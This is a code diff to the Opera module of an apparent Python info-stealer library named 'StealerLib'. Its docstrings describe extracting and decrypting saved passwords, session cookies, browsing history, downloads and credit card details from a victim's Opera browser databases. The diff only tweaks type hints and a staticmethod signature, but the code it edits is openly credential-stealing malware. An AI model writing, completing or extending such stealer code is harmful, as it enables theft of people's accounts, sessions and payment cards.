@@ -36,7 +36,7 @@ class Opera:
         self.opera_history = []
         self.opera_banking = []
 
-    def oget(self, func: callable, conv: bool=True) -> list:
+    def oget(self, func: callable, conv: Optional[bool]=True) -> list:
         temp_data = []
 
         for _, path in self.paths.items():
@@ -53,7 +53,7 @@ class Opera:
         return temp_data
 
     @staticmethod
-    def get_encryption_key(self, path: str) -> bytes:
+    def get_encryption_key(path: str) -> bytes:
         """Retrieves the master encryption key used to encrypt the user's data
 
         Parameters:
@@ -99,7 +99,7 @@ class Opera:
 
         return decrypted_pass
 
-    def _opera_passwords(self, path: str, conv: bool=True) -> list:
+    def _opera_passwords(self, path: str, conv: Optional[bool]=True) -> list:
         """Retrieves the site url, username and password from the passed Opera browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
@@ -109,7 +109,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -143,7 +143,7 @@ class Opera:
 
         return self.opera_passwords
 
-    def _opera_cookies(self, path: str, conv: bool=True) -> list:
+    def _opera_cookies(self, path: str, conv: Optional[bool]=True) -> list:
         """Retrieves the site host, cookie name, value and various other information from the passed Opera browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
@@ -153,7 +153,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
+            list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -190,7 +190,7 @@ class Opera:
 
         return self.opera_cookies
 
-    def _opera_history(self, path: str, conv: bool=True) -> list:
+    def _opera_history(self, path: str, conv: Optional[bool]=True) -> list:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -200,7 +200,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -233,7 +233,7 @@ class Opera:
 
         return self.opera_history
 
-    def _opera_downloads(self, path: str, conv: bool=True) -> list:
+    def _opera_downloads(self, path: str, conv: Optional[bool]=True) -> list:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -243,7 +243,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
+            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -274,7 +274,7 @@ class Opera:
 
         return self.opera_downloads
 
-    def _opera_credit_cards(self, path: str, conv: bool=True) -> list:
+    def _opera_credit_cards(self, path: str, conv: Optional[bool]=True) -> list:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
@@ -284,7 +284,7 @@ class Opera:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
+            list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
